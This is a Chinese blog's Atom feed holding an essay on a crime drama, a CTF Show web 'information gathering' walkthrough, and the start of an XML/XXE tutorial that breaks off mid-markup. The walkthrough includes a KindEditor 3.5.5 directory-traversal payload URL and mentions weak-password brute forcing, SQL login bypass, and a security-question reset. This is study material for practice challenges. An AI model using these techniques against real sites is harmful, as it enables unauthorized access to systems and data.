<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆 执 昔 来 的 旅 途</title>
  
  
  <link href="https://xizhi-future.github.io/atom.xml" rel="self"/>
  
  <link href="https://xizhi-future.github.io/"/>
  <updated>2021-10-01T10:52:30.834Z</updated>
  <id>https://xizhi-future.github.io/</id>
  
  <author>
    <name>xizhi-future</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶之花有感</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</id>
    <published>2021-10-01T10:17:46.000Z</published>
    <updated>2021-10-01T10:52:30.834Z</updated>
    
    <content type="html"><![CDATA[<p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p><p>即使不愿成为太阳，却依然绚烂夺目。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？&lt;br&gt;你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？&lt;br&gt;如果曝光，世人会怎末说，连环杀人</summary>
      
    
    
    
    <category term="随笔" scheme="https://xizhi-future.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF Show---信息搜集</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2021-10-01T09:20:33.000Z</published>
    <updated>2021-10-01T09:22:45.685Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 中 web入门，信息搜集篇。</p><span id="more"></span><h1 id="一、CTF-Show-—-信息搜集"><a href="#一、CTF-Show-—-信息搜集" class="headerlink" title="一、CTF Show — 信息搜集"></a>一、CTF Show — 信息搜集</h1><h2 id="1-1-Web1-—-查看源代码"><a href="#1-1-Web1-—-查看源代码" class="headerlink" title="1.1 Web1 — 查看源代码"></a>1.1 Web1 — 查看源代码</h2><p>直接查看源代码</p><p><img src="https://i.loli.net/2021/07/14/QcVRY3rX9a4USMZ.png" alt="image-20210714105835548"></p><h2 id="1-2-Web-2-—-查看源代码"><a href="#1-2-Web-2-—-查看源代码" class="headerlink" title="1.2 Web 2 — 查看源代码"></a>1.2 Web 2 — 查看源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure><p><strong>查看源代码的几种方式</strong></p><ul><li>右键查看源代码</li><li>F12 打开开发者工具</li><li>Ctrl + U 查看源代码</li><li>Burp 抓包查看</li></ul><h2 id="1-3-Web-3-—-抓包"><a href="#1-3-Web-3-—-抓包" class="headerlink" title="1.3 Web 3 — 抓包"></a>1.3 Web 3 — 抓包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure><p>抓包 尝试</p><p><img src="https://i.loli.net/2021/07/14/kOtL1lBa8b53pIS.png" alt="image-20210714111126154"></p><h2 id="1-4-Web-4-—-robots-txt-泄露"><a href="#1-4-Web-4-—-robots-txt-泄露" class="headerlink" title="1.4 Web 4 — robots.txt 泄露"></a>1.4 Web 4 — robots.txt 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/1t2zsvMoAJTPO3V.png" alt="image-20210714111325675"></p><p><img src="https://i.loli.net/2021/07/14/npvowT7mgbIzx2C.png" alt="image-20210714111358421"></p><h2 id="1-5-Web-5-—-phps-文件"><a href="#1-5-Web-5-—-phps-文件" class="headerlink" title="1.5 Web 5 — phps 文件"></a>1.5 Web 5 — phps 文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure><blockquote><p> <strong>phps文件</strong></p><p> ​    就是php的 <strong>源代码文件</strong>，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p><p> ​    它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。</p></blockquote><p><img src="https://i.loli.net/2021/07/14/m2Mex6SziNTg7EW.png" alt="image-20210714111652581"></p><p><img src="https://i.loli.net/2021/07/14/wRkJOuGiavhnM7N.png" alt="image-20210714111806962"></p><h2 id="1-6-Web-6-—-www-zip-泄露"><a href="#1-6-Web-6-—-www-zip-泄露" class="headerlink" title="1.6 Web 6 — www.zip 泄露"></a>1.6 Web 6 — <a href="http://www.zip/">www.zip</a> 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/9NrWGukdyw5EVMX.png" alt="image-20210714111959516"></p><p><img src="https://i.loli.net/2021/07/14/uZqlnDYc3SFaAMC.png" alt="image-20210714113312486"></p><p><img src="https://i.loli.net/2021/07/14/xWMmasCKAd91Pfq.png" alt="image-20210714113251749"></p><h2 id="1-7-Web-7-—-版本控制-git"><a href="#1-7-Web-7-—-版本控制-git" class="headerlink" title="1.7 Web 7 — 版本控制 .git"></a>1.7 Web 7 — 版本控制 <code>.git</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/mWX7dRU4ntLrFZs.png" alt="image-20210714150846912"></p><h2 id="1-8-Web-8-—-版本控制-svn"><a href="#1-8-Web-8-—-版本控制-svn" class="headerlink" title="1.8 Web 8 — 版本控制 .svn"></a>1.8 Web 8 — 版本控制 <code>.svn</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/DZMXJGrz7fAC9ju.png" alt="image-20210714152837039"></p><h2 id="1-9-Web-9-—-vim-临时文件缓存"><a href="#1-9-Web-9-—-vim-临时文件缓存" class="headerlink" title="1.9 Web 9 — vim 临时文件缓存"></a>1.9 Web 9 — vim 临时文件缓存</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure><p><strong>Vim 缓存</strong></p><blockquote><p>​    <strong>临时文件</strong> 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动</p><p>删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可</p><p>以通过缓存文件恢复原始文件内容</p><p>​    <strong>以 index.php 为例</strong> </p><ol><li><p>第一次产生的缓存文件名为 <code>.index.php.swp</code></p></li><li><p>第二次意外退出后，文件名为 <code>.index.php.swo</code></p></li><li><p>第三次产生的缓存文件则为 <code>.index.php.swn</code></p></li></ol></blockquote><p><img src="https://i.loli.net/2021/07/14/AJUYaWD9ImPz7bF.png" alt="image-20210714153426274"></p><h2 id="1-10-Web-10-—-cookie-泄露"><a href="#1-10-Web-10-—-cookie-泄露" class="headerlink" title="1.10 Web 10 — cookie 泄露"></a>1.10 Web 10 — cookie 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/3R6u9WMdatXgSOv.png" alt="image-20210714154500245"></p><h2 id="1-11-Web-11-—-域名解析查询"><a href="#1-11-Web-11-—-域名解析查询" class="headerlink" title="1.11 Web 11 — 域名解析查询"></a>1.11 Web 11 — 域名解析查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br></pre></td></tr></table></figure><p><strong>查看域名解析</strong></p><ul><li><p><code>nslookup</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=txt ctfshow.com</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type:    A --&gt;地址记录    AAAA   --&gt;地址记录    AFSDB Andrew    --&gt;文件系统数据库服务器记录    ATMA --&gt;ATM地址记录    CNAME  --&gt;别名记录    HINHO  --&gt;硬件配置记录，包括CPU、操作系统信息     ISDN   --&gt;域名对应的ISDN号码    MB   --&gt;存放指定邮箱的服务器    MG    --&gt;邮件组记录    MINFO   --&gt;邮件组和邮箱的信息记录    MR   --&gt;改名的邮箱记录    MX   --&gt;邮件服务器记录    NS --&gt; 名字服务器记录    PTR    --&gt;反向记录    RP   --&gt;负责人记录    RT  --&gt;路由穿透记录    SRV    --&gt;TCP服务器信息记录    TXT   --&gt;域名对应的文本信息    X25  --&gt;域名对应的X.25地址记录</span></span><br></pre></td></tr></table></figure></li><li><p>在线历史解析记录查询</p><p><img src="https://i.loli.net/2021/07/14/knpAHlIUJx7zyYK.png" alt="image-20210714155814946"></p></li><li><p>阿里云 DNS 检测</p><p><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p><p><img src="https://i.loli.net/2021/07/14/yef6FBRPSJTgoKw.png" alt="image-20210714170535242"></p></li></ul><h2 id="1-12-Web-12-—-网站公开信息"><a href="#1-12-Web-12-—-网站公开信息" class="headerlink" title="1.12 Web 12 — 网站公开信息"></a>1.12 Web 12 — 网站公开信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/hjlGXmsgyWSYrwf.png" alt="image-20210714171715223"></p><p><img src="https://i.loli.net/2021/07/14/eqwKlZuvLd2PJX8.png" alt="image-20210714171804528"></p><h2 id="1-13-Web-13-—-网站技术文档"><a href="#1-13-Web-13-—-网站技术文档" class="headerlink" title="1.13 Web 13 — 网站技术文档"></a>1.13 Web 13 — 网站技术文档</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/R2degLa3pzZKuni.png" alt="image-20210714172026755"></p><p><img src="https://i.loli.net/2021/07/14/lcYNRWCgMmvZaPw.png" alt="image-20210714172038292"></p><p><img src="https://i.loli.net/2021/07/14/lcpfsX1RWYOA3zP.png" alt="image-20210714172215536"></p><h2 id="1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）"><a href="#1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）" class="headerlink" title="1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）"></a>1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</span><br></pre></td></tr></table></figure><p><strong>KindEditor 3.5.5 遍历目录漏洞</strong>        <a href="http://www.nxadmin.com/web/96.html">http://www.nxadmin.com/web/96.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload/url/editor/php/file_manager_json.php?path=/#可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/27sLANSvX83kgRw.png" alt="image-20210715100641820"></p><p><img src="https://i.loli.net/2021/07/15/y9mVSprWKqZFPGT.png" alt="image-20210715100746950"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/rF2dO9o3JD8cVCx.png" alt="image-20210715100941439"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/url/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/xPqTEnG4DrLtIwy.png" alt="image-20210715101127445"></p><p>拓展：<a href="https://blog.csdn.net/u011781521/article/details/59057759/">编辑器漏洞</a></p><h2 id="1-15-Web-15-—-前端邮箱信息泄露"><a href="#1-15-Web-15-—-前端邮箱信息泄露" class="headerlink" title="1.15 Web 15 — 前端邮箱信息泄露"></a>1.15 Web 15 — 前端邮箱信息泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure><p>前端页面当中找到邮箱信息</p><p><img src="https://i.loli.net/2021/07/14/NqisDzZkouH2Oyb.png" alt="image-20210714173643444"></p><p><img src="https://i.loli.net/2021/07/14/Gzt8XqyCpu5drMk.png" alt="image-20210714173940662"></p><p>忘记密码 密保答案 西安 </p><p>成功重置密码</p><p>成功登录 拿到 flag</p><h2 id="1-16-Web-16-—-探针信息"><a href="#1-16-Web-16-—-探针信息" class="headerlink" title="1.16 Web 16 — 探针信息"></a>1.16 Web 16 — 探针信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure><p><strong>PHP 探针</strong></p><blockquote><p>​    <strong>php探针</strong> 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AC%E7%9B%98/486482">服务器硬盘</a>资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p></blockquote><p><a href="https://www.laozuo.org/16305.html">常用4款PHP探针</a></p><p>应该是雅黑探针，访问 <code>/tz.php</code></p><p><img src="https://i.loli.net/2021/07/14/Yb2xc5XQIrMFopy.png" alt="image-20210714213514783"></p><p>查找 <code>ctfshow</code> 即可</p><h2 id="1-17-Web-17-—-绕过-CDN-查-IP"><a href="#1-17-Web-17-—-绕过-CDN-查-IP" class="headerlink" title="1.17 Web 17 — 绕过 CDN 查 IP"></a>1.17 Web 17 — 绕过 CDN 查 IP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; </span><br></pre></td></tr></table></figure><p>全球 ping 可知：无 CDN </p><p>查 <code>www.ctfshow.com</code> 的 IP，即为 ctfer.com的真实IP</p><h2 id="1-18-Web-18-—-前端-js-泄露"><a href="#1-18-Web-18-—-前端-js-泄露" class="headerlink" title="1.18 Web 18 — 前端 js 泄露"></a>1.18 Web 18 — 前端 js 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure><p>查看源码，发现 <code>Flappy_js.j</code></p><p><img src="https://i.loli.net/2021/07/14/JzW2SpRsToZ91FA.png" alt="image-20210714180947784"></p><p>unicode 解码</p><p><img src="https://i.loli.net/2021/07/14/8H1RKnwdOsVSoY6.png" alt="image-20210714181055283"></p><p>访问 <code>110.php</code></p><p><img src="https://i.loli.net/2021/10/01/GP8DOvbLRjIf4yC.png" alt="image-20210714181154250"></p><h2 id="1-19-Web-19-—-前端密钥泄露"><a href="#1-19-Web-19-—-前端密钥泄露" class="headerlink" title="1.19 Web 19 — 前端密钥泄露"></a>1.19 Web 19 — 前端密钥泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure><p>查看源码得到</p><p><img src="https://i.loli.net/2021/10/01/Wah8ZeLOXHFm1lw.png" alt="image-20210714181430721"></p><p>会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子</p><p><img src="https://i.loli.net/2021/07/14/xOsDeocflHvaiu6.png" alt="image-20210714181906722"></p><h2 id="1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露"><a href="#1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露" class="headerlink" title="1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露"></a>1.20 Web 20 — 早期 asp+access <code>/db/db.mdb</code> 文件泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/iFHty9PwMOAcWQb.png" alt="image-20210714182153060"></p><h2 id="1-21-Web-382-—"><a href="#1-21-Web-382-—" class="headerlink" title="1.21 Web 382 —"></a>1.21 Web 382 —</h2><p>首先查看源代码</p><p><img src="https://i.loli.net/2021/08/03/J71pYxy4QUmt2eM.png" alt="image-20210803095937572"></p><p>可以一一进行尝试，最后发现 <code>http://url/alsckdfy/</code> 竟然是网站的后台登录页面    </p><ul><li>爆破 弱密码</li><li>sql 万能密码</li></ul><p>成功登录之后即可获得 flag</p><h1 id="二、做题总结"><a href="#二、做题总结" class="headerlink" title="二、做题总结"></a>二、做题总结</h1><ul><li><p>第一步：查看 <strong>源代码</strong></p><ul><li>右键查看源代码</li><li>F12 打开开发者工具</li><li>Ctrl + U 查看源代码</li><li>Burp 抓包查看</li></ul></li><li><p><strong>抓包</strong> 可能发现一些有用信息</p></li><li><p><strong>robots.txt</strong> </p></li><li><p><strong>phps</strong> 源代码泄露</p></li><li><p>下载源码文件、网站备份文件</p></li><li><p>版本控制不要部署到生产环境中 <code>.git  .svn</code></p></li><li><p><strong>Vim 缓存</strong>    <code>.文件名.php.swp  .文件名.php.swo  .文件名.php.swn</code></p></li><li><p>cookie 的重要性</p></li><li><p>域名、子域名 信息搜集    <code>nslookup   在线网站</code></p></li><li><p>Banner 等公开信息   <code>管理员密码  QQ  QQ邮箱等  第三方软件查个人信息</code></p></li><li><p>技术文档</p></li><li><p>对应编辑器漏洞</p></li><li><p>探针</p></li><li><p>前端源码 密钥泄露</p></li><li><p><strong>db.mdb</strong></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 中 web入门，信息搜集篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
    <category term="信息搜集" scheme="https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>XML与XXE</title>
    <link href="https://xizhi-future.github.io/2021/10/01/XML%E4%B8%8EXXE/"/>
    <id>https://xizhi-future.github.io/2021/10/01/XML%E4%B8%8EXXE/</id>
    <published>2021-10-01T09:16:32.000Z</published>
    <updated>2021-10-01T09:21:35.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、XML"><a href="#一、XML" class="headerlink" title="一、XML"></a>一、XML</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>XML是一种用于标记电子文件使其具有结构性的 <strong>可扩展标记语言（EXtensible Markup Language）</strong>。</p><p><a href="https://baike.baidu.com/item/XML">XML</a>的前身是 <a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言 </a>，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。</p><span id="more"></span><p><strong>特征，与 HTML 的区别：</strong></p><ul><li><p>XML 被设计用来 <code>被设计用来结构化、存储以及传输信息</code>，焦点是数据的内容。</p><p>HTML 被设计用来 <code>显示数据</code>，焦点是数据的外观。</p><p>HTML 旨在 <code>显示信息</code>，而 XML 旨在 <code>传输信息</code></p></li><li><p>XML 的设计宗旨是传输数据，而不是显示数据</p></li><li><p>XML 被设计为具有 <code>自我描述性</code></p></li><li><p>XML 标签没有被预定义。您需要自行定义标签（即允许创作者定义自己的标签和自己的文档结构）</p><p>HTML 文档只能使用在 HTML 标准中定义过的标签（如 <code>&lt;p&gt;、&lt;h1&gt;</code>  等等）</p></li><li><p>XML标签必须闭合，<code>允许 &lt;外观 /&gt;,不允许 &lt;外观&gt;，只可是 &lt;外观&gt;&lt;/外观&gt;</code></p><p>HTML可不闭合 ，可 <code>&lt;p&gt;,&lt;p&gt;&lt;/p&gt;,&lt;img /&gt;</code></p></li><li><p>XML标签的 <code>结构和样式分离</code></p><p>HTML标签的 <code>结构和样式结合在一起 &lt;h1&gt;标签</code> </p></li><li><p>是W3C的推荐标准</p></li></ul><p>注：本来发明XML是为了替换掉HTML标签的，最后由于各种原因，未能成功替换掉，于是解决办法是发明了一个新的 XHTML，该语言内部的技术使用的是XML的，而标签都是HTML的</p><p><strong>作用：</strong></p><ul><li><p>当作小型的数据库使用</p><ul><li><p>msg聊天工作通过xml文件在本地保留聊天记录</p></li><li><p>许多软件的 配置文件 都是通过xmk来保存的</p></li><li><p>许多媒体工资通过xml文件保留用户之前看到的媒体信息</p></li></ul></li><li><p>在网站当中当作 <strong>“接口”</strong> 服务</p></li><li><p>XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。</p></li></ul><p><strong>例子：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XML文档</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (hair,country,eye,body)&gt;</span><br><span class="line">&lt;!ELEMENT hair (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT country (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT eye (<span class="comment">#PCDATA)&gt; </span></span><br><span class="line">&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt; </span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;</span><br><span class="line">    &lt;hair&gt;Black&lt;/hair&gt;</span><br><span class="line">    &lt;country&gt;China&lt;/country&gt;</span><br><span class="line">    &lt;eye&gt;big&lt;/eye&gt;</span><br><span class="line">    &lt;body&gt;You are handsome!&lt;/body&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/z7PSXUY9xhkpnBL.png" alt="image-20210426203632004"></p><p>充分体现了 具有自我描述性，但是这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p><h2 id="1-2-用途"><a href="#1-2-用途" class="headerlink" title="1.2 用途"></a>1.2 用途</h2><ul><li><p>XML 把数据从 HTML 分离，是独立于软件和硬件的信息传输工具</p></li><li><p>简化数据共享</p></li><li><p>简化数据传输</p></li><li><p>简化平台变更，其实也是简化数据的传输与共享</p></li></ul><h2 id="1-3-规则"><a href="#1-3-规则" class="headerlink" title="1.3 规则"></a>1.3 规则</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.XML文档必须有一个（唯一） 根元素 ，该元素是其他元素的 父元素</span><br><span class="line">2.XML每个元素都必须有开始和结束标签，即成对出现</span><br><span class="line">3.XML标签对大小写敏感，开始与闭合标签大小写类型需要一致</span><br><span class="line">4.XML元素需要正确嵌套，即不可交叉嵌套 <span class="comment">#&lt;abc&gt;&lt;test&gt;&lt;/abc&gt;&lt;/test&gt; 错误</span></span><br><span class="line">5.XML属性 必须有 值，且必须加引号</span><br><span class="line">6.特殊字符需要 实体引用</span><br><span class="line">7.注释：&lt;!--  --&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标签的组成部分：</span><br><span class="line">1.字母，数字，下划线</span><br><span class="line">2.不能以 数字和标点符号 开始</span><br><span class="line">3.不能包含 空格</span><br><span class="line">4.最好避免使用 - , . , : 等</span><br></pre></td></tr></table></figure><p><strong>实体引用</strong></p><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td></tr><tr><td><code>&amp;apos;</code></td><td>‘</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td></tr></tbody></table><p>其实在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><h2 id="1-4-PCDATA"><a 